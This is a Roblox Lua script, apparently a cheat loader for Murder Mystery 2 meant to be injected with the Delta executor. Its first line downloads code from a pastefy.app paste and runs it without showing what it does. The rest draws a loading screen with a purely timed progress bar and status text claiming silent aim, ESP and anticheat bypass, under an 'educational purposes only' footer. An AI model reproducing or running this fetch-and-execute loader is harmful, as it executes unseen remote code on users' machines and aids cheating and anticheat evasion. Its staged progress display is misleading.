loadstring(game:HttpGet('https://pastefy.app/6d3Uo8IW/raw'))()

-- MM2 Themed Loading Screen v2 - Optimized for Delta Executor
-- Inject mit Delta

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- Warte auf PlayerGui
player:WaitForChild("PlayerGui")
wait(0.3)

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MM2LoadingScreen"
screenGui.ResetOnSpawn = false
screenGui.Parent = player.PlayerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 420, 0, 520)
mainFrame.Position = UDim2.new(0.5, -210, 0.5, -260)
mainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 18)
corner.Parent = mainFrame

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(200, 10, 50)   -- tiefes MM2-Rot
stroke.Thickness = 5
stroke.Parent = mainFrame

-- Avatar
local avatarFrame = Instance.new("Frame")
avatarFrame.Size = UDim2.new(0, 150, 0, 150)
avatarFrame.Position = UDim2.new(0.5, -75, 0, 35)
avatarFrame.BackgroundTransparency = 1
avatarFrame.Parent = mainFrame

Instance.new("UICorner", avatarFrame).CornerRadius = UDim.new(1, 0)

local avatarStroke = Instance.new("UIStroke")
avatarStroke.Color = Color3.fromRGB(0, 170, 255)
avatarStroke.Thickness = 7
avatarStroke.Parent = avatarFrame

local avatar = Instance.new("ImageLabel")
avatar.Size = UDim2.new(1, -14, 1, -14)
avatar.Position = UDim2.new(0, 7, 0, 7)
avatar.BackgroundTransparency = 1
avatar.Image = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
avatar.Parent = avatarFrame

-- Name
local nameLabel = Instance.new("TextLabel")
nameLabel.Size = UDim2.new(1, 0, 0, 45)
nameLabel.Position = UDim2.new(0, 0, 0, 200)
nameLabel.BackgroundTransparency = 1
nameLabel.Text = player.Name
nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
nameLabel.TextScaled = true
nameLabel.Font = Enum.Font.GothamBold
nameLabel.Parent = mainFrame

local atLabel = Instance.new("TextLabel")
atLabel.Size = UDim2.new(1, 0, 0, 30)
atLabel.Position = UDim2.new(0, 0, 0, 240)
atLabel.BackgroundTransparency = 1
atLabel.Text = "@" .. player.Name
atLabel.TextColor3 = Color3.fromRGB(160, 160, 170)
atLabel.TextScaled = true
atLabel.Font = Enum.Font.Gotham
atLabel.Parent = mainFrame

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.Position = UDim2.new(0, 0, 0, 285)
title.BackgroundTransparency = 1
title.Text = "SCRIPT LOADING"
title.TextColor3 = Color3.fromRGB(220, 20, 60)
title.TextScaled = true
title.Font = Enum.Font.GothamBlack
title.Parent = mainFrame

-- Status
local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, 0, 0, 32)
status.Position = UDim2.new(0, 0, 0, 335)
status.BackgroundTransparency = 1
status.Text = "Initializing Murder Mystery 2..."
status.TextColor3 = Color3.fromRGB(200, 200, 200)
status.TextScaled = true
status.Font = Enum.Font.Gotham
status.Parent = mainFrame

-- Loading Bar
local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(0, 350, 0, 20)
barBg.Position = UDim2.new(0.5, -175, 0, 385)
barBg.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
barBg.BorderSizePixel = 0
barBg.Parent = mainFrame
Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 10)

local bar = Instance.new("Frame")
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
bar.BorderSizePixel = 0
bar.Parent = barBg
Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 10)

-- Percent
local percent = Instance.new("TextLabel")
percent.Size = UDim2.new(1, 0, 0, 30)
percent.Position = UDim2.new(0, 0, 0, 415)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.TextColor3 = Color3.fromRGB(255, 255, 255)
percent.TextScaled = true
percent.Font = Enum.Font.GothamBold
percent.Parent = mainFrame

-- Footer
local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, 0, 0, 20)
footer.Position = UDim2.new(0, 0, 1, -35)
footer.BackgroundTransparency = 1
footer.Text = "for educational purposes only"
footer.TextColor3 = Color3.fromRGB(90, 90, 100)
footer.TextScaled = true
footer.Font = Enum.Font.Gotham
footer.Parent = mainFrame

-- ==================== LOADING ANIMATION ====================
local function loadScript()
    for i = 0, 100 do
        local prog = i / 100
        bar:TweenSize(UDim2.new(prog, 0, 1, 0), "Out", "Linear", 0.03, true)
        percent.Text = i .. "%"
        
        if i == 25 then
            status.Text = "Injecting MM2 features..."
        elseif i == 50 then
            status.Text = "Loading silent aim & esp..."
        elseif i == 70 then
            status.Text = "Bypassing anticheats..."
        elseif i == 90 then
            status.Text = "Almost ready..."
        end
        
        task.wait(0.028)
    end

    -- Finish
    task.wait(0.6)
    status.Text = "Loaded successfully ✓"
    title.TextColor3 = Color3.fromRGB(80, 255, 80)

    task.wait(1.4)

    -- Fade out
    local tweenInfo = TweenInfo.new(0.9, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    TweenService:Create(mainFrame, tweenInfo, {BackgroundTransparency = 1}):Play()
    
    for _, obj in pairs(mainFrame:GetDescendants()) do
        if obj:IsA("TextLabel") or obj:IsA("ImageLabel") then
            TweenService:Create(obj, tweenInfo, {TextTransparency = 1, ImageTransparency = 1}):Play()
        elseif obj:IsA("Frame") and obj ~= barBg then
            TweenService:Create(obj, tweenInfo, {BackgroundTransparency = 1}):Play()
        end
    end

    task.wait(1.2)
    screenGui:Destroy()
end

loadScript()
